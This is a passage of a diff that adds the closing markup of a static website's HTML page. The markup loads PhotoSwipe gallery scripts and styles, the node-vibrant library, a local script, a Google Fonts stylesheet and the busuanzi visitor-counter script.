+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+    </body>
+</html>
